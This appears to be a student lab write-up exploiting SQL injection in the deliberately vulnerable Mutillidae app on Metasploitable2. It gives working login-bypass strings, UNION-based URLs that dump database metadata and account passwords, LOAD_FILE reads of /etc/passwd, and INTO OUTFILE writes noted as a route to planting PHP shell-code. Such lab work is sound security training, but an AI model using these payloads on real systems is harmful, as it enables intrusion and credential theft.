# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database.

Identify IP address using ifconfig in Metasploitable2

![z](https://github.com/Rajeshanbu/sqlinjection/assets/118924713/43f0215e-8e7b-4c95-b3e1-ca1262240f6e)


Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.

![z1](https://github.com/Rajeshanbu/sqlinjection/assets/118924713/a10781aa-28e7-4b92-a22f-4132217a80cf)


Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![z2](https://github.com/Rajeshanbu/sqlinjection/assets/118924713/b2d0873c-a2f1-4903-b0e3-7a4ad3b5c54b)


Click on the menu Login/Register and register for an account 

![z3](https://github.com/Rajeshanbu/sqlinjection/assets/118924713/2bf62a43-c615-4d19-be4c-9fc1e8acba22)


Click on the link “Please register here”

![z4](https://github.com/Rajeshanbu/sqlinjection/assets/118924713/f46e2ffa-e4c6-44b4-9cc2-47d0efa50d76)

![z5](https://github.com/Rajeshanbu/sqlinjection/assets/118924713/975c88ed-98ed-4303-b80f-389e83fa5688)


Click on “Create Account” to display the following page:


![m](https://github.com/Rajeshanbu/sqlinjection/assets/118924713/b7e3150d-ed2a-452f-b093-9fb9f827c804)



The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.
![z5](https://github.com/Rajeshanbu/sqlinjection/assets/118924713/a7178bf5-11f5-4563-93b9-ad52b49d8999)



Click “Login”. The logged in page will show as below:

![z6](https://github.com/Rajeshanbu/sqlinjection/assets/118924713/eedb5f70-86db-4340-9985-430c7e090db9)


## Bypassing login field
The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.

![z7](https://github.com/Rajeshanbu/sqlinjection/assets/118924713/aa84a36a-062d-4c0d-846c-7e64fba7f121)



Click the login button and you will see it enter into the administrator page. 

![z8](https://github.com/Rajeshanbu/sqlinjection/assets/118924713/5477b88e-902c-4acc-b4b5-dac14383c04a)




## Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below: 

![z9](https://github.com/Rajeshanbu/sqlinjection/assets/118924713/157c912c-155e-49df-b55b-7dd5d53b95e8)

![z10](https://github.com/Rajeshanbu/sqlinjection/assets/118924713/3ed89787-8daf-4fc6-95f9-c6e102ffa408)

![z11](https://github.com/Rajeshanbu/sqlinjection/assets/118924713/b2de31f5-3d05-4fb4-b001-95420540f04f)

![z12](https://github.com/Rajeshanbu/sqlinjection/assets/118924713/27071748-3146-49c6-8666-210dd2909205)

![z13](https://github.com/Rajeshanbu/sqlinjection/assets/118924713/c9e4c6bd-a0b5-429e-a5d6-c8250559d2c9)




From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.

![z14](https://github.com/Rajeshanbu/sqlinjection/assets/118924713/9e038e55-ef9e-49dd-a7d2-1144cf6062b0)



Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details 

![z15](https://github.com/Rajeshanbu/sqlinjection/assets/118924713/7644e427-48f5-4106-b6e9-2cedb663e9b6)




After adding the order by 6 into the existing url , the following error statement will be obtained:

![z16](https://github.com/Rajeshanbu/sqlinjection/assets/118924713/22019ac6-e5a3-47cb-95f7-8cc9b93dd4f8)


When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.

![z17](https://github.com/Rajeshanbu/sqlinjection/assets/118924713/2b961197-1575-45e3-8bf4-7e55dd2b2d91)




As it is having 5 columns the query worked fine and it provides the correct result 

![z18](https://github.com/Rajeshanbu/sqlinjection/assets/118924713/e87c59c0-b6ee-4fe9-96ee-70d25e5cdbcb)


Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5). 

![z19](https://github.com/Rajeshanbu/sqlinjection/assets/118924713/7a1ae4f4-06e8-4ac8-947f-ce738fcb8f6d)



As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information. 

![z20](https://github.com/Rajeshanbu/sqlinjection/assets/118924713/92588561-7991-4eef-990a-e7cc878fad7d)




Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details 

![z21](https://github.com/Rajeshanbu/sqlinjection/assets/118924713/22d8094e-7457-4b40-a7bf-27ced91c8257)



The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details 

![z22](https://github.com/Rajeshanbu/sqlinjection/assets/118924713/29af83c3-e90c-470e-b786-03f040dbba6a)




The url once executed will retrieve table names from the “owasp 10” database.

## Extracting sensitive data such as passwords
When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.
![z23](https://github.com/Rajeshanbu/sqlinjection/assets/118924713/cf902a05-f11f-49b5-afc3-b950a3e4dfe2)




The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details 

![z24](https://github.com/Rajeshanbu/sqlinjection/assets/118924713/7c669216-b074-4d1f-a533-e70ab45aece6)




Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details 

![z25](https://github.com/Rajeshanbu/sqlinjection/assets/118924713/f19e0481-f43a-46ee-a47d-72631a246290)


## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details 

![z25](https://github.com/Rajeshanbu/sqlinjection/assets/118924713/f19e0481-f43a-46ee-a47d-72631a246290)

![z27](https://github.com/Rajeshanbu/sqlinjection/assets/118924713/298a3eb7-3334-468f-868e-0234959f2401)



the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).

## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
